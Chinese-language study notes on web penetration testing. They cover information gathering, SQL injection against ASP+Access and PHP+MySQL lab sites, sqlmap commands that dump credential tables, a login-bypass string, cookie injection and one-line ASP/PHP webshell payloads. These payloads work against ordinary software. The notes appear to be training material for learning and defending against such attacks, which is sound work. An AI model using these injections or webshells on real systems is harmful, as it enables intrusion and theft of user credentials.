- 在吴翰清的《白帽子讲web安全》一书中，将黑客技术的发展划分为三个阶段：
第一阶段，黑客们的攻击目标主要是网络、操作系统以及软件
第二阶段，黑客们的攻击目标主要是web服务器端，典型方法SQL注入
第三阶段，黑客们的攻击目标主要是客户端，典型的方法XSS及CSRF攻击

- 信息安全的学习方向

渗透测试，学习掌握已有的漏洞以及相应的利用方式，在网络中寻找存在这些漏洞的点，进行攻击或防御

漏洞挖掘，对系统进行深入分析，挖掘之前别人没有发现的漏洞(0day漏洞)

- 学习平台推荐

i春秋 www.ichunqiu.com
合天网安 www.hetianlab.com
freebuf www.freebuf.com
51cto www.51cto.com

- 书籍推荐

web安全深度剖析
疯狂的硬盘

- 漏洞响应平台

乌云网wooyun.org
 最知名的白帽社区
 最大的漏洞提交平台
 需要提交足够rank的漏洞方可注册
补天网loudong.360.cn
 提交漏洞可获得现金奖励

# 网站基础

## 网站基础与信息收集

### 网页语言

动态网页主要由ASP、PHP、ASP.NET、JSP语言编写。ASP和PHP技术一般多用于中小型网站
ASP.NET和JSP一般用于大型网站

### 数据库

采用动态网页的网站，内容大都存储在数据库中，数据库通常是网站的核心组成部分

目前常用的网络数据库主要有：
Access,微软的小型数据库，主要用于小型网站，大都采用ASP+Access组合
Mssql,微软的大型数据库，主要用于中小型网站
MySQL,Oracle公司的中小型数据库，开源，主要用于中小型网站，大都采用PHP+MySQL组合
Oracle,Oracle公司的大型数据库，一般采用一些大型网站中

数据库一般是由库、表、字段的结构组成

### 传值方法

网站服务器端从客户端获取数据的方法主要有两种：
get方法，只能获取少量数据，总量不能超过100个字符
post方法，适合传输较多数据，如用户注册、留言本等

### web服务器程序(web容器)

常用的web服务器程序
IIS，WinSrv系统的内置组件。win2003中的IIS版本为6.0，win2008中的IIS版本为7.0(7.5)
Apache,开源软件，主要运行于Linux平台
nginx,开源软件，主要用于Linux平台

### web环境

网页程序、数据库、web服务器程序综合在一起，就构成了一个完整的web环境
ASP+Access+IIS
ASP+Mssql+IIS
PHP+MySQL+Apache
PHP+MySQL+nginx

### web服务器

虚拟主机，在一台服务器中同时运行多个网站，所有这些网站共享相同的IP地址
服务器托管，网站采用独立服务器和独立的ip地址，这些服务器往往都是托管在ISP机房内

## 网站信息收集

### 域名与IP

国际通用的顶级域名：net、com、org
国内的域名：com.cn、edu.cn、gov.cn

执行命令"ping www.baidu.com",可获得域名对应的IP

### 站长工具 tool.chinaz.com

whois查询
通过查询whois可以获取站点域名的详细信息

备案信息
只有服务器在中国境内搭建的网站才需要进行备案，备案信息经过了政府部门的审核，比较真实可靠

### 同IP网站查询

可以查询到目标网站时独立服务器还是公用服务器

网站排名
百度权重，衡量一个网站被百度搜索引擎的认可度，值从1到10
PR查询，PageRank(网页级别)，网站被Google的认可度，值从0到10
Alexa排名，网站的世界排名，是较为权威的网站访问量评价指标

### 判断web环境

SEO综合查询
whatweb

# SQL注入漏洞

## 什么是SQL注入

SQL注入的核心思想：
黑客在正常的需要调用数据库数据的URL后面构造一段数据库查询代码，然后根据返回的结果，从而获得想要的某些数据。

SQL注入漏洞(SQL injection)是web层面最高危的漏洞之一，曾连续3年在OWASP年度十大漏洞中排名第一

## MySQL

SQL结构化查询语言，绝大多数关系型数据库(MySQL、Access、Oracle等)都采用SQL进行查询、管理及常用操作
MySQL是被广泛使用的一种开源数据库，官方网站www.mysql.com

### AppServ

通过AppServ,可以在windows系统中快速搭建出一个Apache+PHP+MySQL的集成web环境

AppServ是开源软件，官网：
http://www.appservnetwork.com,建议下载2.6.10版本

## SQL语言

### union select 联合查询

union联合查询可以一次性执行两个或多个查询，并将它们的结果组合在一起输出显示
union联合查询的基本规则：所有查询中的列数必须相同

select * from news union select username,password from hack;

### MySQL中的注释语句

单行注释
#，以"#"号开头，直到该行行尾，全部是注释内容
--,以"--"号开头，直到该行行尾，全部是注释内容("--"与注释内容之间要加有空格)

多行注释
/*...*/,"/*"用于注释文字的开头，"*/"用于注释文字的结尾

select * from hack;#union select 1,id,title from news;

### ASP+Access注入

判断注入点
select * from news where id=16

select * from news where id=16 and 1=1
select * from news where id=16 and 1=2

使用exists函数判断数据库等是否存在

使用order by猜字段数量

判断回显位置

- 猜解表名

http://192.168.80.128/shownews.asp?id=16 and exists(select * from manage_user)
select * from news where id=16 and exists(select * from manage_user)

常见表名：
admin user adminuser manage manager manage_user

- 猜解字段名

http://192.168.80.128/shownews.asp?id=16 and exists(select username from manage_user)

select * from news where id=16 and exists(select username from manage_user)

常见字段名：
账号：name username user_name admin adminuser admin_user admin_username adminname
密码：password pass userpass user_pass pwd userpwd adminpwd admin_pwd

- 猜解字段数量

http://192.168.80.128/shownews.adp?id=16 order by 11
select * from news where id=16 order by 11

既可猜解字段数量，又可获知可以显示内容的字段：
http://192.168.80.128/shownews.asp?id=16 union select 1,2,3,4,5,6,7,8,9,10,11 from manage_user

- 爆出字段内容

http://192.168.80.128/shownews.asp?id=16 union select 1,username,password,4,5,6,7,8,9,10,11 from manage_user

- 寻找后台管理入口

http://192.168.80.128/admin
网站后台管理入口一般存放在名为admin或是manage的网站子目录下
也可以在管理入口页面源代码中寻找字段名

### PHP+MySQL

- 元数据库information_schema

在5.0以后的版本的MySQL中存在着一个元数据库information_schema，其中存储着用户在MySQL中创建的所有其它数据库的信息

在对PHP+MySQL类网站进行注入时，主要就是针对information_schema数据库进行操作

- information_schema中比较重要的数据表

schemata:用于存放所有数据库的名字
tables:用于存放所有数据库中的数据表的名字
columns:用于存放所有数据库的所有数据表中的所有字段的名字

- 利用information_schema查看其他数据库的内容

查看test数据库中包含了哪些表
select table_name from information_schema.tables where table_schema="test";

查看hack数据表中包含了哪些字段
select column_name from information_schema.columns where table_name="hack";

- 常规操作

判断注入点 and 1=1 and 1=2

判断字段数量 order by 5

判断可显字段 union select 1,2,3,4,5
MySQL中在执行联合查询时，后面的查询语句不必非要指定数据表名，这点区别于Access
也可以：
http://192.168.80.128/info_show.php?info_id=142 and 1=2 union select 1,2,3,4,5

- 爆出敏感信息

爆出当前用户名和数据库名
union select 1,user(),database(),4,5

爆出govcn数据库中包含的数据表
union select 1,table_name,3,4,5 from information_schema.tables where table_schema="govcn"

通过group_concat()函数可以显示字段中的所有内容

爆字段名
union select 1,column_name,3,4,5 from information_schema.columns where table_name='admin'

爆用户名和密码
union select 1,username,password,4,5 from admin
union select 1,unhex(hex(username)),unhex(hex(password)),4,5 from admin
利用unhex(hex())函数进行编码转换，解决网站编码不一致导致的问题

7a57a admin md5

### 注入工具的使用

穿山甲Pangolin 胡萝卜Havij

### 密码绕过漏洞

目标网站
NPMserv中的政府网站，后台入口页面glzx.php

验证用户名和密码的语句
select * from admin where username = '$username' and password='$mpassword'

绕过语句
1' or 1=1 or '1

将绕过语句代入到查询语句中
select * from admin where username = '1' or 1=1 or '1' and password='$mpassword'

逻辑表达式中，and的优先级高于or

### sqlmap的安装与使用

sqlmap是目前功能最为广泛的注入类工具

sqlmap是开源软件，被集成于Kali Linux,官网www.sqlmap.org

sqlmap基于python编写

- 注入ACCESS数据库

猜解字段名

sqlmap.py -u "http://192.168.80.128/shownews.asp?id=16" --columns -T "manage_user"
"-T"选项，指定对哪个表进行猜解
"--columns"选项，告诉sqlmap这次的任务是猜解字段名

爆出字段内容

sqlmap.py -u "http://192.168.80.128/shownews.asp?id=16" --dump -C "username,password" -T "manage_user"
选项 "--dump"连同选项"-C"一起使用，意为猜解指定字段中的内容

sqlmap将检测结果保存到C:\Users\用户名\.sqlmap\output目录中(/root/.sqlmap/output)

- 注入MySQL数据库

检测注入点
sqlmap.py -u http://192.168.80.130/info_show.php?info_id=142

信息探测
sqlmap.py -u "http://192.168.80.130/info_show.php?info_id=142" --is-dba
判断站点的当前用户是否为数据库管理员
sqlmap.py -u "http://192.168.80.130/info_show.php?info_id=142" --dbs
检测站点中包含哪些数据库
sqlmap.py -u "http://192.168.80.130/info_show.php?info_id=142" --current-db
检测当前使用的是哪个数据库
sqlmap.py -u "http://192.168.80.130/info_show.php?info_id=142" --current-user
检测当前用户

注入流程
sqlmap.py -u "http://192.168.80.130/info_show.php?info_id=142" --tables -D "govcn"

sqlmap.py -u "http://192.168.80.130/info_show.php?info_id=142" --columns -T "admin" -D "govcn"

sqlmap.py -u "http://192.168.80.130/info_show.php?info_id=142" --dump -C "username,password" -T "admin" -D "govcn"

# cookie注入

## cookie

cookie用于在客户端本地保存用户访问网站时的一些身份验证信息

cookie与get和post方法一样，都可用于客户端向服务器端传递数据

## cookie注入

目标网站：南方数据5.0
检测注入点
sqlmap.py -u "http://192.168.80.131/shownews.asp" --cookie "id=16" --level 2

--level,指定探测等级
sqlmap共有五个等级，默认为1
级别1，探测GET和POST数据
级别2，探测cookie数据

# 文件上传漏洞

## 什么是webshell

webshell是利用ASP或PHP等语言编写的基于web的木马后门

通过webshell可以控制web站点，包括上传下载文件、查看数据库、执行系统命令等

上传漏洞的利用目的：将webshell上传到目标服务器中

## 一句话木马

一句话木马，一小段ASP或PHP代码，是一个小型webshell

可以将一句话木马保存成单独的网页文件，也可以将代码插入到网站的某个asp或php网页文件中

之后就可以通过中国菜刀这类客户端软件进行远程连接，从而控制整个网站

### ASP

<%eval request("pass")%>

### PHP

<?php @eval($_POST['pass']);?>

